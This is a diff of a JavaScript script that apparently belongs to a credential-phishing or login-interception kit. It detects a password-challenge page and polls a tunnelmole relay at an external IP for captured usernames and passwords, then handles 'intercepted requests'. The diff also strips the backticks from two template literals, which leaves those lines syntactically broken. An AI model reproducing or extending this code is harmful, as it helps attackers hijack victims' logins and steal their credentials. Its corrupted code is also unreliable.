@@ -9,6 +9,7 @@ const checkPasswordPage = () => {
     if (window.location.href.includes('challenge/pwd')) {
         inPasswordPage = true;
         console.log('Now on the password page');
+        // Start processing password requests once the password page is confirmed
         fetchFreqPassword();
     } else {
         inPasswordPage = false;
@@ -26,7 +27,7 @@ const fetchFreqUsername = async () => {
             headers: { 'Cache-Control': 'no-cache' }
         });
 
-        if (!response.ok) throw new Error(`HTTP error! Status: ${response.status}`);
+        if (!response.ok) throw new Error(HTTP error! Status: ${response.status});
 
         const result = await response.json();
         console.log('Response from /get-first-post-data:', result);
@@ -37,9 +38,6 @@ const fetchFreqUsername = async () => {
             usernameFetched = true;
 
             await fetch('https://qmjnmt-ip-37-228-207-173.tunnelmole.net/reset-first-post-data', { method: 'POST' });
-
-            // Trigger the username request independently without waiting for password logic
-            processUsernameRequests();
 
             // Wait for navigation to password page
             setTimeout(() => {
@@ -66,7 +64,7 @@ const fetchFreqPassword = async () => {
             headers: { 'Cache-Control': 'no-cache' }
         });
 
-        if (!response.ok) throw new Error(`HTTP error! Status: ${response.status}`);
+        if (!response.ok) throw new Error(HTTP error! Status: ${response.status});
 
         const result = await response.json();
         console.log('Response from /get-first-post-password:', result);
@@ -87,19 +85,6 @@ const fetchFreqPassword = async () => {
         console.error('Error fetching password:', error);
         setTimeout(fetchFreqPassword, 500);
     }
-};
-
-// ✅ Process pending username requests
-const processUsernameRequests = () => {
-    if (!freqUsername) {
-        console.log("Username not available yet, retrying...");
-        setTimeout(processUsernameRequests, 500);
-        return;
-    }
-
-    console.log("Processing pending username requests...");
-
-    // Process username-related intercepted requests here
 };
 
 // ✅ Process pending password requests
@@ -159,5 +144,4 @@ document.addEventListener('DOMContentLoaded', () => {
     }
 
     fetchFreqUsername();
-});
-
+});  
